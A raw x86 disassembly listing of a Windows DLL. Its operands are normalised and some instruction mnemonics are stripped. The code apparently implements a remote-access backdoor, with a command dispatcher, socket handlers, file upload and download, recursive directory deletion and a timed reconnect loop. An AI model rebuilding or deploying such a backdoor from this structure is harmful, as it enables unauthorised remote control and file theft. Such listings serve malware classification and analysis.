call sub_10001fe0
jmp r-xdata
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x244 ]
[ edi ]
not ecx
dec ecx
push eax
mov [ esp + 0x14 ] ecx
lea ecx [ esp + 0x18 ]
push ecx
push 0x4
push edx
push ebp
call ebx
lea eax [ esp + 0x14 ]
push 0x0
push eax
lea ecx [ esp + 0x18 ]
push 0x4
push ecx
push ebp
call ebx
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea ecx [ esp + 0x2c ]
push eax
push ecx
push ebp
call ebx
jmp r-xdata
sub_10002300
sub esp 0x14
push ebx
push ebp
push esi
mov ebx 0x4
push edi
mov edi [ malloc@IAT ]
push ebx
call edi
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax [ esp + 0x2c ]
mov ebp [ esp + 0x28 ]
dec eax
cmp eax 0xf
ja r-xdata
mov [ esp + 0x1c ] r--data
jmp [ eax * 4 + jump_table_100026b0 ]
push 0x270
call edi
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x14 ]
call sub_10001980
mov esi eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x34 ]
xor esi esi
test ebx ebx
jbe r-xdata
mov edx [ esp + 0x30 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
mov edi [ _mbscmp@IAT ]
push rw-data
not ecx
dec ecx
push edx
mov ebx edx
lea esi [ ecx + edx + 0x1 ]
call edi
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ eax ]
add eax 0x4
push ecx
push eax
lea ecx [ esp + 0x18 ]
call sub_10001960
jmp r-xdata
mov esi [ esp + 0x30 ]
lea ecx [ esp + 0x10 ]
push esi
call sub_10001bd0
test eax eax
jne r-xdata
mov esi [ esp + 0x30 ]
lea ecx [ esp + 0x10 ]
push esi
call sub_10001c10
test eax eax
jne r-xdata
mov ecx [ esp + 0x30 ]
push ecx
push ebp
call sub_100033f0
add esp 0x8
test eax eax
jne r-xdata
mov eax 0x1
mov [ rw-data ] eax
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
push eax
push ebp
call sub_10003930
add esp 0x8
mov ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x14 ]
call sub_10001e40
test eax eax
mov [ esp + 0x20 ] eax
jne r-xdata
mov ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x14 ]
call sub_10001e80
mov ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x14 ]
call sub_10001ee0
mov esi eax
test esi esi
jne r-xdata
push esi
lea ecx [ esp + 0x14 ]
call sub_10001c20
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x18 ]
push edx
push eax
mov [ esp + 0x20 ] 0x3
mov [ esp + 0x28 ] esi
call sub_10003930
push esi
call sub_10002a70
push esi
call [ free@IAT ]
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
mov edx [ esp + 0x28 ]
lea ecx [ esp + 0x18 ]
push ecx
push edx
mov [ esp + 0x20 ] 0x1
call sub_10003930
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov ebp [ esp + 0x30 ]
push rw-data
push esi
call edi
add esp 0x8
test eax eax
jne r-xdata
xor ebx ebx
test eax eax
jne r-xdata
push esi
lea ecx [ esp + 0x14 ]
call sub_10001e40
test eax eax
mov [ esp + 0x20 ] eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
lea edx [ esp + 0x14 ]
mov [ esi ] eax
push edx
push 0x0
push esi
push sub_100026f0
push 0x0
push 0x0
call [ _beginthreadex@IAT ]
add esp 0x18
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
lea edx [ esp + 0x18 ]
mov [ esp + 0x18 ] ebx
push edx
mov [ esp + 0x20 ] 0x24
push ebp
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x18 ]
push edx
push eax
mov [ esp + 0x20 ] 0x1
call sub_10003930
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
lea ecx [ eax + eax * 2 ]
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x18 ]
mov [ esp + 0x18 ] ebx
shl ecx 0x3
push edx
push eax
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] esi
call sub_10003930
push esi
call [ free@IAT ]
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x0
push ecx
push ebp
call sub_10003930
add esp 0x8
lea edi [ esi + ebp ]
lea ecx [ esp + 0x10 ]
push edi
call sub_10001910
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea esi [ esi + ecx + 0x1 ]
cmp esi ebx
jb r-xdata
push esi
push ebx
lea ecx [ esp + 0x18 ]
call sub_10001940
test eax eax
jne r-xdata
xor esi esi
mov edx [ esp + 0x28 ]
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] 0x24
push edx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov ecx [ esp + 0x28 ]
lea eax [ esp + 0x18 ]
push eax
push ecx
mov [ esp + 0x20 ] 0x1
call sub_10003930
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
call [ GetLastError@IAT ]
mov [ esp + 0x1c ] eax
jmp r-xdata
call sub_10003930
mov eax [ esp + 0x28 ]
push eax
call [ free@IAT ]
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
sub_100026f0
push ecx
mov eax [ esp + 0x8 ]
push ebp
mov ebp [ free@IAT ]
push esi
mov esi [ eax ]
push edi
push eax
call ebp
push esi
call sub_1000d7d0
push esi
mov edi eax
call sub_1000d5a0
push edi
call sub_10004380
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push esi
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
pop ecx
retn 0x4
push esi
call sub_1000d5a0
add esp 0x4
push edi
call [ closesocket@IAT ]
pop edi
pop esi
xor eax eax
pop ebp
pop ecx
retn 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
add eax 0x8
push ecx
test edx edx
push eax
mov [ rw-data ] 0x0
push esi
je r-xdata
call sub_100027b0
mov edx [ esp + 0x20 ]
add esp 0xc
push edx
call ebp
add esp 0x4
jmp r-xdata
call sub_10002920
mov edx [ esp + 0x20 ]
add esp 0xc
push edx
call ebp
add esp 0x4
jmp r-xdata
sub_100027b0
sub esp 0xc
push ebx
push ebp
push esi
push edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push edx
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x10 ]
push eax
mov edi [ eax ]
mov [ esp + 0x1c ] edi
call [ free@IAT ]
mov esi [ esp + 0x2c ]
add esp 0x4
test esi esi
je r-xdata
mov ecx [ esp + 0x24 ]
push rw-data
push ecx
mov eax [ esp + 0x24 ]
push rw-data
push eax
jmp r-xdata
push 0x0
push esi
push ebx
call [ fseek@IAT ]
add esp 0xc
test edi edi
jbe r-xdata
call [ fopen@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
push ebx
call [ fclose@IAT ]
add esp 0x4
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
test edi edi
ja r-xdata
mov edi [ esp + 0x14 ]
mov ebp [ esp + 0x10 ]
cmp edi 0x401
jne r-xdata
xor esi esi
test edi edi
jbe r-xdata
mov esi rw-data
mov eax ebp
mov edx [ esp + 0x18 ]
push ebp
sub edx edi
mov [ esp + 0x1c ] edx
call [ free@IAT ]
mov edi [ esp + 0x1c ]
add esp 0x4
sub edi esi
push ebx
push edi
lea eax [ esi + ebp ]
push 0x1
push eax
call [ fwrite@IAT ]
mov edi [ esp + 0x24 ]
mov ebp [ esp + 0x20 ]
add esi eax
add esp 0x10
cmp esi edi
jb r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push ebp
call [ free@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x8
mov [ rw-data ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_10002920
sub esp 0x408
push ebx
push ebp
push esi
mov esi [ esp + 0x41c ]
push edi
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] 0x0
push esi
[ edi ]
call sub_10002ed0
mov edi [ esp + 0x428 ]
mov ebp [ esp + 0x420 ]
add esp 0x4
sub eax edi
mov [ esp + 0x10 ] eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x4
push eax
push ebp
call sub_100045c0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push rw-data
push esi
call [ fopen@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
push 0x0
push edi
push ebx
call [ fseek@IAT ]
mov eax [ esp + 0x1c ]
add esp 0xc
test eax eax
jbe r-xdata
push ebx
call [ fclose@IAT ]
add esp 0x4
mov edi [ fread@IAT ]
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x14 ]
lea edx [ esp + 0x14 ]
[ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x401
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
push ebp
call sub_100045c0
push ebx
mov [ rw-data ] 0x0
call [ fclose@IAT ]
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
push ebx
push 0x400
lea ecx [ esp + 0x1c ]
push 0x1
push ecx
call edi
add esp 0x10
mov esi eax
cmp eax 0x1
jne r-xdata
lea edx [ esp + 0x14 ]
push esi
push edx
push ebp
call sub_100045c0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x10 ]
sub eax esi
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
sub_10002a90
push ebp
mov ebp esp
push 0xffffffff
push sub_1006b0b0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34c
push ebx
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x217 ]
mov [ ebp - 0x218 ] 0x0
mov edx [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi edx
or ecx 0xffffffff
xor eax eax
lea ebx [ ebp - 0x218 ]
[ edi ]
not ecx
sub edi ecx
mov [ ebp - 0x10 ] esp
mov eax ecx
mov esi edi
mov edi ebx
mov [ ebp - 0x4 ] 0x0
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp [ ebp + ecx - 0x219 ] 0x5c
je r-xdata
lea eax [ ebp - 0x218 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea edi [ ebp - 0x218 ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x118 ]
[ edi ]
not ecx
sub edi ecx
mov ebx 0x1
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0x118 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0x358 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ ebp - 0x118 ]
push ecx
call [ FindFirstFileA@IAT ]
mov [ ebp - 0x14 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x218 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp - 0x14 ]
push edx
call [ FindClose@IAT ]
lea eax [ ebp - 0x218 ]
push eax
call [ RemoveDirectoryA@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x358 ]
push edx
push eax
call [ FindNextFileA@IAT ]
lea ecx [ ebp - 0x32c ]
push rw-data
push ecx
mov ebx eax
call [ _mbscmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
test ebx ebx
je r-xdata
lea edx [ ebp - 0x32c ]
push rw-data
push edx
call [ _mbscmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
lea esi [ ebp - 0x118 ]
sub edi ecx
mov eax ecx
mov [ ebp - 0x18 ] esi
mov esi edi
mov edi [ ebp - 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp [ ebp + ecx - 0x119 ] 0x5c
je r-xdata
lea edi [ ebp - 0x32c ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x118 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ ebp - 0x358 ]
mov ecx edx
and ecx 0x3
cmp eax 0x10
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x118 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x33c ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x118 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0x118 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_10002a90
add esp 0x4
jmp r-xdata
lea ecx [ ebp - 0x118 ]
push ecx
call sub_10002a70
add esp 0x4
jmp r-xdata
sub_10002d60
sub esp 0x110
mov dl [ rw-data ]
push ebx
push ebp
push esi
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x1d ]
mov [ esp + 0x1c ] dl
mov [ esp + 0x10 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x124 ]
xor eax eax
mov [ esp + 0x11 ] eax
or ecx 0xffffffff
mov [ esp + 0x15 ] eax
lea edx [ esp + 0x1c ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x19 ] al
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
xor ebp ebp
[ edi ] [ esi ]
mov edx [ esp + 0x140 ]
test edx edx
je r-xdata
cmp ebx 0xffffffff
je r-xdata
lea eax [ esp + 0x10 ]
push 0xa
push eax
push ebp
call [ _itoa@IAT ]
mov edi [ esp + 0x130 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x1c ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x1c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
inc ebp
cmp ebx 0xffffffff
[ edi ] [ esi ]
je r-xdata
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
lea esi [ esp + 0x1c ]
[ edi ]
not ecx
dec ecx
mov edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x110
retn
mov ecx [ esp + 0x13c ]
mov edx [ esp + 0x138 ]
mov eax [ esp + 0x134 ]
push ecx
mov ecx [ esp + 0x134 ]
push edx
mov edx [ esp + 0x134 ]
push eax
mov eax [ esp + 0x134 ]
push ecx
push edx
lea ecx [ esp + 0x30 ]
push eax
push ecx
call [ CreateFileA@IAT ]
mov ebx eax
call [ GetLastError@IAT ]
cmp eax 0x50
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x110
retn
sub_10002ed0
mov eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push edi
push 0x2
push 0x0
push esi
call [ fseek@IAT ]
push esi
call [ ftell@IAT ]
push esi
mov edi eax
call [ fclose@IAT ]
add esp 0x14
mov eax edi
pop edi
pop esi
retn
pop esi
retn
sub_10002f10
push ecx
lea eax [ esp ]
push eax
push 0x0
push 0x0
push sub_10002f40
push 0x0
push 0x0
call [ _beginthreadex@IAT ]
add esp 0x18
test eax eax
je r-xdata
mov eax 0x1
pop ecx
retn
push eax
call [ CloseHandle@IAT ]
sub_10002f40
sub esp 0x14
push ebx
push ebp
push esi
push edi
call sub_10003d70
test eax eax
jne r-xdata
mov ebp [ rw-data ]
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventA@IAT ]
mov edi [ Sleep@IAT ]
mov ebx [ _beginthreadex@IAT ]
mov [ rw-data ] eax
mov esi 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x4
mov eax [ rw-data ]
push eax
call [ ResetEvent@IAT ]
call sub_100041f0
test eax eax
je r-xdata
call eax
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
push rw-data
call sub_10003f10
add esp 0xc
test eax eax
je r-xdata
push 0xea60
call edi
call sub_100041f0
test eax eax
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
push rw-data
call sub_10004110
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_100042d0
add esp 0x8
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
lea eax [ esi + esi * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
shl ecx 0x4
push ecx
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ebp
push ecx
call sub_100042d0
add esp 0x8
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov ax [ esp + 0x18 ]
lea ecx [ esp + 0x20 ]
mov [ rw-data ] edx
push ecx
lea edx [ esp + 0x14 ]
push 0x0
push edx
push sub_100030e0
push 0x0
push 0x0
mov [ rw-data ] ax
call ebx
add esp 0x18
test eax eax
je r-xdata
call edi
cmp esi 0x400
jae r-xdata
lea eax [ esi + esi * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x4
push eax
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push sub_100030e0
push 0x0
push 0x0
mov [ rw-data ] edx
mov [ rw-data ] bp
call ebx
add esp 0x18
test eax eax
je r-xdata
mov edx [ rw-data ]
push 0xffffffff
push edx
mov esi 0x1
call [ WaitForSingleObject@IAT ]
push 0x2710
call edi
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
add esi esi
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
sub_100030e0
sub esp 0xc
mov eax [ esp + 0x10 ]
push ebx
push esi
push edi
mov eax [ eax ]
push eax
mov [ esp + 0x20 ] eax
call sub_1000d7d0
add esp 0x4
mov ebx eax
push ebx
call [ closesocket@IAT ]
mov ecx [ esp + 0x1c ]
push ecx
call sub_1000d5a0
mov edx [ rw-data ]
add esp 0x4
push edx
call [ SetEvent@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0xc
retn 0x4
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0xc ]
push ecx
push edx
push eax
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0xc ]
mov edi [ free@IAT ]
push eax
mov esi [ eax ]
call edi
add esp 0x4
test esi esi
je r-xdata
mov edx [ esp + 0x1c ]
push 0x228
push rw-data
push edx
call sub_100045c0
add esp 0xc
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_1000d5a0
add esp 0x4
push ebx
call [ closesocket@IAT ]
mov ecx [ rw-data ]
push ecx
call [ SetEvent@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0xc
retn 0x4
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x10 ]
lea eax [ esp + 0xc ]
push edx
push eax
push ecx
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_1000d5a0
add esp 0x4
push ebx
call [ closesocket@IAT ]
mov ecx [ rw-data ]
push ecx
call [ SetEvent@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0xc
retn 0x4
mov edx [ esp + 0x1c ]
push edx
call sub_1000d5a0
add esp 0x4
push ebx
call [ closesocket@IAT ]
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0xc
retn 0x4
cmp eax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x4
je r-xdata
mov eax [ esp + 0xc ]
push 0x4
push rw-data
push eax
call [ strncmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push eax
call edi
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x20 ]
push ecx
push 0x0
push edx
push sub_100032f0
push 0x0
push 0x0
call [ _beginthreadex@IAT ]
add esp 0x1c
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_1000d5a0
add esp 0x4
push ebx
call [ closesocket@IAT ]
mov edx [ rw-data ]
push edx
call [ SetEvent@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0xc
retn 0x4
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventA@IAT ]
mov esi [ WaitForSingleObject@IAT ]
mov edi [ ResetEvent@IAT ]
mov [ rw-data ] eax
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call edi
jmp r-xdata
mov eax [ rw-data ]
push 0xafc8
push eax
call esi
cmp eax 0x102
je r-xdata
sub_100032f0
mov eax [ esp + 0x4 ]
sub esp 0x10
push ebx
mov ebx [ eax ]
push ebp
push esi
push edi
xor ebp ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10
retn 0x4
cmp eax 0x1
jne r-xdata
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x24 ]
push ecx
push edx
push ebx
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x24 ]
mov edi [ eax ]
cmp edi 0xffffffff
jne r-xdata
mov esi [ eax + 0x4 ]
push eax
call [ free@IAT ]
add esp 0x4
cmp esi ebp
jne r-xdata
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ esp + 0x24 ]
push ecx
call [ free@IAT ]
add esp 0x4
jmp r-xdata
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] ebp
push eax
push ebx
mov [ esp + 0x20 ] r--data
call sub_10003930
add esp 0x8
jmp r-xdata
push 0xc
call [ malloc@IAT ]
mov esi eax
add esp 0x4
cmp esi ebp
jne r-xdata
push ebp
push ebx
mov [ esi + 0x4 ] edi
call sub_100033f0
add esp 0x8
cmp eax ebp
je r-xdata
mov [ esp + 0x14 ] ebp
call [ GetLastError@IAT ]
lea edx [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
push edx
push ebx
call sub_10003930
add esp 0x8
jmp r-xdata
push esi
mov [ esi ] eax
mov [ esi + 0x8 ] ebp
call sub_10003610
push esi
call [ free@IAT ]
add esp 0x8
jmp r-xdata
sub_100033f0
mov ax [ rw-data ]
mov ecx [ rw-data ]
sub esp 0x11c
push ebx
push ebp
push esi
push edi
push eax
push ecx
call sub_100042d0
mov esi eax
xor edi edi
add esp 0x8
cmp esi edi
jne r-xdata
push esi
call sub_1000d7d0
add esp 0x4
mov ebp eax
mov [ esp + 0x10 ] edi
jmp r-xdata
mov [ esp + 0x10 ] edi
jmp r-xdata
cmp eax 0x1
je r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x130 ]
lea edx [ esp + 0x10 ]
push edx
push eax
call sub_10003930
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
call [ GetLastError@IAT ]
mov ecx [ esp + 0x130 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x10 ]
push eax
push ecx
call sub_10003930
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
mov eax [ esp + 0x1c ]
mov ebx [ free@IAT ]
push eax
mov edx [ eax + 0x4 ]
mov edi [ eax ]
mov [ esp + 0x28 ] edx
call ebx
add esp 0x4
test edi edi
je r-xdata
jmp r-xdata
mov edx [ esp + 0x134 ]
mov [ esp + 0x10 ] 0x1
test edx edx
mov ebp 0x4
je r-xdata
push ebp
call [ closesocket@IAT ]
push esi
call sub_1000d5a0
add esp 0x4
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x1c ]
push ecx
push edx
push esi
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
call sub_10003930
add esp 0x8
mov edi edx
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x10 ] ebp
[ edi ]
not ecx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] 0x0
test eax eax
jne r-xdata
cmp [ esp + 0x20 ] ebp
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ebp
push rw-data
push ecx
call [ strncmp@IAT ]
mov edx [ esp + 0x28 ]
add esp 0xc
test eax eax
push edx
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call ebx
mov eax [ esp + 0x134 ]
lea edx [ esp + 0x14 ]
push edx
push eax
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x20 ] r--data
call sub_10003930
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x1c ]
push eax
push ecx
push esi
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
